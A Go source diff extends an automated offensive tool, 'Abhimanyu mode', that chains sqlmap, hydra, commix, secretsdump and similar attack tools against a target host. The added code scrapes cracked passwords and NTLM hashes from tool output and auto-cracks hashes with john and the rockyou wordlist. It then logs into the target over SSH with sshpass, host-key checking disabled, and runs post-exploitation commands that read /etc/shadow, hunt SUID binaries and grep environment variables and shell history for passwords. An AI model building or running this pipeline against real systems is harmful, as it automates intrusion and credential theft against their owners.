@@ -43,6 +43,7 @@ type AbhimanyuContext struct {
 	TargetType  string // "domain" | "ip"
 	VulnType    string // "all" | "sqli" | "xss" | "rce" | "auth" | "network" | "postexploit" | "lateral" | "exfil"
 	LHOST       string // attacker IP for reverse shells
+	LPORT       string // listener port (default 4444)
 
 	// From hunt (pre-populated if chained)
 	LiveURLs     []string
@@ -54,10 +55,16 @@ type AbhimanyuContext struct {
 	WAFVendor    string
 	Technologies []string
 
+	// Credentials found during exploitation
+	CredsFound   []string // "user:pass" pairs
+	HashesFound  []string // NTLM/MD5/SHA hashes
+	TokensFound  []string // JWT/API tokens
+
 	// Populated during exploit phases
 	Results       []ExploitResult
 	ShellObtained bool
-	ShellType     string // "bash" | "meterpreter" | "cmd"
+	ShellType     string // "bash" | "meterpreter" | "cmd" | "os-shell"
+	ShellEvidence string // actual output proving shell
 
 	// Session tracking for continuous research
 	SessionID   string
@@ -68,21 +75,25 @@ type AbhimanyuContext struct {
 
 // AbhimanyuSession is persisted to disk for continuous research across sessions
 type AbhimanyuSession struct {
-	Target      string            `json:"target"`
-	VulnType    string            `json:"vuln_type"`
-	LHOST       string            `json:"lhost"`
-	StartedAt   time.Time         `json:"started_at"`
-	LastUpdated time.Time         `json:"last_updated"`
-	ToolsRun    []string          `json:"tools_run"`
-	Findings    map[string]string `json:"findings"`
-	ShellObtained bool            `json:"shell_obtained"`
-	ShellType   string            `json:"shell_type"`
-	OpenPorts   []int             `json:"open_ports"`
-	VulnsFound  []string          `json:"vulns_found"`
-	XSSFound    []string          `json:"xss_found"`
-	ParamsFound []string          `json:"params_found"`
-	WAFDetected bool              `json:"waf_detected"`
-	Technologies []string         `json:"technologies"`
+	Target        string            `json:"target"`
+	VulnType      string            `json:"vuln_type"`
+	LHOST         string            `json:"lhost"`
+	LPORT         string            `json:"lport"`
+	StartedAt     time.Time         `json:"started_at"`
+	LastUpdated   time.Time         `json:"last_updated"`
+	ToolsRun      []string          `json:"tools_run"`
+	Findings      map[string]string `json:"findings"`
+	ShellObtained bool              `json:"shell_obtained"`
+	ShellType     string            `json:"shell_type"`
+	ShellEvidence string            `json:"shell_evidence"`
+	OpenPorts     []int             `json:"open_ports"`
+	VulnsFound    []string          `json:"vulns_found"`
+	XSSFound      []string          `json:"xss_found"`
+	ParamsFound   []string          `json:"params_found"`
+	CredsFound    []string          `json:"creds_found"`
+	HashesFound   []string          `json:"hashes_found"`
+	WAFDetected   bool              `json:"waf_detected"`
+	Technologies  []string          `json:"technologies"`
 }
 
 // AbhimanyuStatusKind represents the live status of an exploit tool
@@ -354,7 +365,6 @@ func RunAbhimanyuMode(ctx *AbhimanyuContext, progress func(AbhimanyuStatus)) []E
 					Kind:   StatusSkipped,
 					Reason: reason,
 				})
-				// Save manual instructions to session dir
 				manualPath := ctx.SessionDir + "/manual_" + spec.Name + ".txt"
 				os.WriteFile(manualPath, []byte(reason+"\n"), 0600)
 				continue
@@ -375,28 +385,71 @@ func RunAbhimanyuMode(ctx *AbhimanyuContext, progress func(AbhimanyuStatus)) []E
 
 			if result.Output != "" {
 				findings[spec.Name] = result.Output
-
-				// ── Real-time context update from tool output ─────────────
 				updateAbhimanyuContext(spec.Name, result.Output, ctx)
 
-				// ── Adaptive: if shell obtained, enable post-exploit ──────
 				if !ctx.ShellObtained && detectShellObtained(result.Output) {
 					ctx.ShellObtained = true
 					ctx.ShellType = detectShellType(result.Output)
-					skipPostExploit = false // unlock post-exploit phases
+					ctx.ShellEvidence = extractShellEvidence(result.Output)
+					skipPostExploit = false
 					progress(AbhimanyuStatus{
 						Tool:   spec.Name,
 						Kind:   StatusDone,
-						Reason: fmt.Sprintf("SHELL OBTAINED: %s — post-exploit phases unlocked", ctx.ShellType),
+						Reason: fmt.Sprintf("🔴 SHELL OBTAINED: %s — post-exploit phases unlocked", ctx.ShellType),
 					})
-					// Save shell info
-					shellInfo := fmt.Sprintf("Shell obtained via %s\nType: %s\nTarget: %s\nTime: %s\n\nOutput snippet:\n%s",
+					shellInfo := fmt.Sprintf("Shell obtained via %s\nType: %s\nTarget: %s\nTime: %s\nEvidence: %s\n\nFull output:\n%s",
 						spec.Name, ctx.ShellType, ctx.Target, time.Now().Format(time.RFC3339),
-						result.Output[:min(500, len(result.Output))])
+						ctx.ShellEvidence, result.Output[:min(2000, len(result.Output))])
 					os.WriteFile(ctx.SessionDir+"/shell_obtained.txt", []byte(shellInfo), 0600)
 				}
 
 				saveSession(ctx, findings)
+			}
+		}
+
+		// ── After Phase 2 (Auth): if creds found, run real SSH post-exploit ──
+		// sshpass must be installed: sudo apt install sshpass -y
+		if phase == 2 && len(ctx.CredsFound) > 0 && containsPort(ctx.OpenPorts, 22) {
+			progress(AbhimanyuStatus{
+				Tool:   "post-exploit-ssh",
+				Kind:   StatusRunning,
+				Reason: fmt.Sprintf("Credentials found (%d) + SSH open — running post-exploit", len(ctx.CredsFound)),
+			})
+			// Install sshpass if needed
+			if !isAvailable("sshpass") {
+				run(30, "bash", "-c", "sudo apt install -y sshpass 2>/dev/null || true")
+			}
+			postResults := RunPostExploitCommands(ctx, progress)
+			results = append(results, postResults...)
+			for _, r := range postResults {
+				if r.Output != "" {
+					findings[r.Tool] = r.Output
+				}
+			}
+			// If SSH post-exploit succeeded, unlock post-exploit phases
+			if ctx.ShellObtained {
+				skipPostExploit = false
+			}
+		}
+
+		// ── After Phase 1 (Web): if hashes found, auto-crack them ────────────
+		if phase == 1 && len(ctx.HashesFound) > 0 {
+			progress(AbhimanyuStatus{
+				Tool:   "auto-crack",
+				Kind:   StatusRunning,
+				Reason: fmt.Sprintf("Auto-cracking %d hashes found in Phase 1", len(ctx.HashesFound)),
+			})
+			// Write hashes to file for john/hashcat
+			hashFile := ctx.SessionDir + "/found_hashes.txt"
+			os.WriteFile(hashFile, []byte(strings.Join(ctx.HashesFound, "\n")), 0600)
+			// Try john first (faster for common hashes)
+			if isAvailable("john") {
+				johnOut, _ := run(120, "john", "--wordlist=/usr/share/wordlists/rockyou.txt", hashFile)
+				if strings.TrimSpace(johnOut) != "" {
+					findings["john-autocrack"] = johnOut
+					updateAbhimanyuContext("john", johnOut, ctx)
+					results = append(results, ExploitResult{Tool: "john-autocrack", Output: johnOut, Success: true})
+				}
 			}
 		}
 	}
@@ -514,38 +567,314 @@ func min(a, b int) int {
 }
 
 // updateAbhimanyuContext extracts intelligence from tool output in real-time.
+// This is the brain of Abhimanyu — it reads every tool's output and extracts
+// credentials, hashes, shell indicators, and vulnerability confirmations.
 func updateAbhimanyuContext(tool, output string, ctx *AbhimanyuContext) {
 	lower := strings.ToLower(output)
+
 	switch tool {
 	case "sqlmap":
-		// Extract database names, tables, credentials
-		if strings.Contains(lower, "available databases") || strings.Contains(lower, "[info] fetching") {
-			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "SQLi confirmed: "+tool)
+		// Extract confirmed SQLi + credentials from dump
+		if strings.Contains(lower, "available databases") || strings.Contains(lower, "identified the following injection") {
+			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "SQLi confirmed via sqlmap")
 		}
-	case "commix":
-		if strings.Contains(lower, "command injection") || strings.Contains(lower, "os-shell") {
-			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "CMDi/RCE confirmed: "+tool)
-		}
-	case "tplmap":
-		if strings.Contains(lower, "ssti") || strings.Contains(lower, "template injection") {
-			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "SSTI confirmed: "+tool)
-		}
-	case "hydra":
-		// Extract cracked credentials
+		// Extract dumped credentials: "| user | password |" table format
 		for _, line := range strings.Split(output, "\n") {
-			if strings.Contains(strings.ToLower(line), "[success]") || strings.Contains(strings.ToLower(line), "login:") {
-				ctx.VulnsFound = appendUnique(ctx.VulnsFound, "Auth bypass: "+strings.TrimSpace(line))
+			if strings.Contains(line, "|") && (strings.Contains(lower, "password") || strings.Contains(lower, "passwd")) {
+				fields := strings.Split(line, "|")
+				if len(fields) >= 3 {
+					cred := strings.TrimSpace(fields[1]) + ":" + strings.TrimSpace(fields[2])
+					if len(cred) > 3 && !strings.Contains(cred, "---") {
+						ctx.CredsFound = appendUnique(ctx.CredsFound, cred)
+					}
+				}
 			}
 		}
+		// Extract hashes
+		extractHashes(output, ctx)
+
+	case "commix":
+		if strings.Contains(lower, "command injection") || strings.Contains(lower, "os-shell") ||
+			strings.Contains(lower, "pseudo-terminal") {
+			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "CMDi/RCE confirmed via commix")
+		}
+		// Extract command output (id, whoami, uname)
+		extractCommandOutput(output, ctx)
+
+	case "tplmap":
+		if strings.Contains(lower, "ssti") || strings.Contains(lower, "template injection") ||
+			strings.Contains(lower, "os-shell") {
+			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "SSTI→RCE confirmed via tplmap")
+		}
+		extractCommandOutput(output, ctx)
+
+	case "hydra":
+		// Extract cracked credentials: "[22][ssh] host: 1.2.3.4   login: admin   password: pass123"
+		for _, line := range strings.Split(output, "\n") {
+			lineLower := strings.ToLower(line)
+			if strings.Contains(lineLower, "[success]") || strings.Contains(lineLower, "login:") {
+				// Parse hydra output format
+				cred := parseHydraCredential(line)
+				if cred != "" {
+					ctx.CredsFound = appendUnique(ctx.CredsFound, cred)
+					ctx.VulnsFound = appendUnique(ctx.VulnsFound, "Auth cracked: "+cred)
+				}
+			}
+		}
+
+	case "john", "hashcat":
+		// Extract cracked hashes: "password123 (admin)"
+		for _, line := range strings.Split(output, "\n") {
+			line = strings.TrimSpace(line)
+			if line == "" || strings.HasPrefix(line, "#") {
+				continue
+			}
+			// hashcat format: "hash:password" or john format: "password (user)"
+			if strings.Contains(line, ":") || (strings.Contains(line, "(") && strings.Contains(line, ")")) {
+				ctx.CredsFound = appendUnique(ctx.CredsFound, "cracked:"+line)
+			}
+		}
+
 	case "linpeas":
 		// Extract privesc vectors
 		if strings.Contains(lower, "sudo") && strings.Contains(lower, "nopasswd") {
-			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "PrivEsc: sudo NOPASSWD found")
+			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "PrivEsc: sudo NOPASSWD")
 		}
-		if strings.Contains(lower, "suid") {
+		if strings.Contains(lower, "suid") && strings.Contains(lower, "/usr/") {
 			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "PrivEsc: SUID binary found")
 		}
+		if strings.Contains(lower, "writable") && strings.Contains(lower, "/etc/passwd") {
+			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "PrivEsc: /etc/passwd writable!")
+		}
+		if strings.Contains(lower, "cve-") {
+			// Extract CVE IDs from linpeas output
+			for _, line := range strings.Split(output, "\n") {
+				if strings.Contains(strings.ToUpper(line), "CVE-") {
+					ctx.VulnsFound = appendUnique(ctx.VulnsFound, "Kernel CVE: "+strings.TrimSpace(line))
+				}
+			}
+		}
+
+	case "bloodhound-python":
+		if strings.Contains(lower, "done") || strings.Contains(lower, "zip") {
+			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "BloodHound data collected — check for attack paths")
+		}
+
+	case "certipy":
+		if strings.Contains(lower, "vulnerable") || strings.Contains(lower, "esc") {
+			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "AD CS vulnerable: "+extractCertipyFinding(output))
+		}
+
+	case "crackmapexec", "netexec":
+		// Extract credentials and shares
+		for _, line := range strings.Split(output, "\n") {
+			if strings.Contains(line, "[+]") {
+				ctx.VulnsFound = appendUnique(ctx.VulnsFound, "CME: "+strings.TrimSpace(line))
+			}
+		}
+		extractHashes(output, ctx)
+
+	case "impacket-secretsdump":
+		// Extract NTLM hashes: "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::"
+		for _, line := range strings.Split(output, "\n") {
+			if strings.Count(line, ":") >= 3 && len(line) > 30 {
+				ctx.HashesFound = appendUnique(ctx.HashesFound, strings.TrimSpace(line))
+			}
+		}
+		if len(ctx.HashesFound) > 0 {
+			ctx.VulnsFound = appendUnique(ctx.VulnsFound, fmt.Sprintf("Dumped %d NTLM hashes", len(ctx.HashesFound)))
+		}
+
+	case "searchsploit":
+		// Extract relevant exploits
+		for _, line := range strings.Split(output, "\n") {
+			if strings.Contains(strings.ToLower(line), "remote") || strings.Contains(strings.ToLower(line), "rce") {
+				ctx.VulnsFound = appendUnique(ctx.VulnsFound, "Exploit: "+strings.TrimSpace(line))
+			}
+		}
+
+	case "msfconsole":
+		// Extract vulns from MSF output
+		if strings.Contains(lower, "vulnerable") || strings.Contains(lower, "success") {
+			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "MSF: "+extractMSFVuln(output))
+		}
+		extractHashes(output, ctx)
 	}
+}
+
+// extractHashes finds NTLM/MD5/SHA hashes in tool output
+func extractHashes(output string, ctx *AbhimanyuContext) {
+	for _, line := range strings.Split(output, "\n") {
+		line = strings.TrimSpace(line)
+		// NTLM hash pattern: 32 hex chars
+		if len(line) >= 32 {
+			fields := strings.Fields(line)
+			for _, f := range fields {
+				if len(f) == 32 || len(f) == 40 || len(f) == 64 {
+					allHex := true
+					for _, c := range f {
+						if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
+							allHex = false
+							break
+						}
+					}
+					if allHex {
+						ctx.HashesFound = appendUnique(ctx.HashesFound, f)
+					}
+				}
+			}
+		}
+	}
+}
+
+// extractCommandOutput extracts id/whoami/uname output from RCE tools
+func extractCommandOutput(output string, ctx *AbhimanyuContext) {
+	for _, line := range strings.Split(output, "\n") {
+		line = strings.TrimSpace(line)
+		// uid=0(root) or uid=33(www-data)
+		if strings.HasPrefix(line, "uid=") {
+			ctx.ShellEvidence = line
+			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "RCE confirmed: "+line)
+		}
+		// Linux kernel version
+		if strings.Contains(line, "Linux") && strings.Contains(line, "#") {
+			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "Kernel: "+line)
+		}
+	}
+}
+
+// parseHydraCredential extracts "user:pass@service" from hydra output line
+func parseHydraCredential(line string) string {
+	// Format: "[22][ssh] host: 1.2.3.4   login: admin   password: pass123"
+	lower := strings.ToLower(line)
+	loginIdx := strings.Index(lower, "login:")
+	passIdx := strings.Index(lower, "password:")
+	if loginIdx < 0 || passIdx < 0 {
+		return ""
+	}
+	loginPart := strings.TrimSpace(line[loginIdx+6:])
+	passPart := strings.TrimSpace(line[passIdx+9:])
+	// Take first word of each
+	loginFields := strings.Fields(loginPart)
+	passFields := strings.Fields(passPart)
+	if len(loginFields) == 0 || len(passFields) == 0 {
+		return ""
+	}
+	return loginFields[0] + ":" + passFields[0]
+}
+
+// extractCertipyFinding extracts the ESC finding from certipy output
+func extractCertipyFinding(output string) string {
+	for _, line := range strings.Split(output, "\n") {
+		if strings.Contains(strings.ToUpper(line), "ESC") {
+			return strings.TrimSpace(line)
+		}
+	}
+	return "AD CS misconfiguration"
+}
+
+// extractMSFVuln extracts vulnerability name from msfconsole output
+func extractMSFVuln(output string) string {
+	for _, line := range strings.Split(output, "\n") {
+		lower := strings.ToLower(line)
+		if strings.Contains(lower, "vulnerable") || strings.Contains(lower, "[+]") {
+			return strings.TrimSpace(line)
+		}
+	}
+	return "vulnerability found"
+}
+
+// RunPostExploitCommands runs real post-exploitation commands when we have SSH access.
+// This is called when hydra/crackmapexec finds valid credentials.
+// It SSHes into the target and runs: id, whoami, uname -a, cat /etc/passwd, find SUID, etc.
+func RunPostExploitCommands(ctx *AbhimanyuContext, progress func(AbhimanyuStatus)) []ExploitResult {
+	var results []ExploitResult
+
+	if len(ctx.CredsFound) == 0 {
+		return results
+	}
+
+	// Try each credential
+	for _, cred := range ctx.CredsFound {
+		parts := strings.SplitN(cred, ":", 2)
+		if len(parts) != 2 {
+			continue
+		}
+		user, pass := parts[0], parts[1]
+		if strings.HasPrefix(user, "cracked") {
+			continue
+		}
+
+		progress(AbhimanyuStatus{
+			Tool:   "post-exploit-ssh",
+			Kind:   StatusRunning,
+			Reason: fmt.Sprintf("Trying SSH with %s:%s", user, pass[:min(3, len(pass))]+"***"),
+		})
+
+		// Real SSH post-exploit commands
+		postExploitCmds := []string{
+			"id",
+			"whoami",
+			"uname -a",
+			"cat /etc/passwd | head -20",
+			"cat /etc/shadow 2>/dev/null | head -5",
+			"sudo -l 2>/dev/null",
+			"find / -perm -4000 -type f 2>/dev/null | head -20",
+			"find / -writable -type f 2>/dev/null | grep -v proc | head -10",
+			"ps aux | head -20",
+			"netstat -tlnp 2>/dev/null | head -20",
+			"cat /etc/crontab 2>/dev/null",
+			"ls -la /home/",
+			"env | grep -i pass 2>/dev/null",
+			"history 2>/dev/null | tail -20",
+		}
+
+		var allOutput strings.Builder
+		allOutput.WriteString(fmt.Sprintf("=== SSH Post-Exploit: %s@%s ===\n\n", user, ctx.Target))
+
+		for _, cmd := range postExploitCmds {
+			// Use sshpass for non-interactive SSH
+			sshCmd := fmt.Sprintf(
+				"sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=no %s@%s '%s' 2>/dev/null",
+				strings.ReplaceAll(pass, "'", "'\\''"), // escape single quotes
+				user, ctx.Target, cmd,
+			)
+			out, err := runShell(15, sshCmd)
+			if err == nil && strings.TrimSpace(out) != "" {
+				allOutput.WriteString(fmt.Sprintf("$ %s\n%s\n\n", cmd, strings.TrimSpace(out)))
+				// Extract intelligence from each command output
+				if strings.HasPrefix(out, "uid=") {
+					ctx.ShellEvidence = strings.TrimSpace(out)
+					ctx.ShellObtained = true
+					ctx.ShellType = "ssh"
+				}
+			}
+		}
+
+		output := allOutput.String()
+		if len(output) > 100 {
+			results = append(results, ExploitResult{
+				Tool:    "post-exploit-ssh",
+				Output:  output,
+				Success: true,
+			})
+			// Save to session
+			os.WriteFile(ctx.SessionDir+"/post_exploit_"+user+".txt", []byte(output), 0600)
+			progress(AbhimanyuStatus{
+				Tool:   "post-exploit-ssh",
+				Kind:   StatusDone,
+				Reason: fmt.Sprintf("Post-exploit complete for %s@%s", user, ctx.Target),
+			})
+			break // success — stop trying other creds
+		}
+	}
+
+	return results
+}
+
+// runShell executes a shell command with timeout
+func runShell(timeoutSec int, shellCmd string) (string, error) {
+	return run(timeoutSec, "bash", "-c", shellCmd)
 }
 
 // detectShellObtained checks if tool output indicates a shell was obtained.
@@ -578,6 +907,21 @@ func detectShellType(output string) string {
 		return "cmd"
 	}
 	return "bash"
+}
+
+// extractShellEvidence extracts the most useful line proving shell access
+func extractShellEvidence(output string) string {
+	for _, line := range strings.Split(output, "\n") {
+		line = strings.TrimSpace(line)
+		if strings.HasPrefix(line, "uid=") || strings.HasPrefix(line, "root@") ||
+			strings.HasPrefix(line, "www-data@") || strings.Contains(line, "os-shell>") {
+			return line
+		}
+	}
+	if len(output) > 100 {
+		return output[:100]
+	}
+	return output
 }
 
 // appendUnique appends to slice only if not already present.
@@ -636,20 +980,28 @@ func saveSession(ctx *AbhimanyuContext, findings map[string]string) {
 	for t := range findings {
 		toolsRun = append(toolsRun, t)
 	}
+	lport := ctx.LPORT
+	if lport == "" {
+		lport = "4444"
+	}
 	session := AbhimanyuSession{
 		Target:        ctx.Target,
 		VulnType:      ctx.VulnType,
 		LHOST:         ctx.LHOST,
+		LPORT:         lport,
 		StartedAt:     ctx.StartedAt,
 		LastUpdated:   time.Now(),
 		ToolsRun:      toolsRun,
 		Findings:      findings,
 		ShellObtained: ctx.ShellObtained,
 		ShellType:     ctx.ShellType,
+		ShellEvidence: ctx.ShellEvidence,
 		OpenPorts:     ctx.OpenPorts,
 		VulnsFound:    ctx.VulnsFound,
 		XSSFound:      ctx.XSSFound,
 		ParamsFound:   ctx.ParamsFound,
+		CredsFound:    ctx.CredsFound,
+		HashesFound:   ctx.HashesFound,
 		WAFDetected:   ctx.WAFDetected,
 		Technologies:  ctx.Technologies,
 	}
@@ -657,7 +1009,6 @@ func saveSession(ctx *AbhimanyuContext, findings map[string]string) {
 	if err != nil {
 		return
 	}
-	// 0600 — session contains exploit findings, credentials, shell info
 	os.WriteFile(ctx.SessionDir+"/session.json", data, 0600)
 }
 
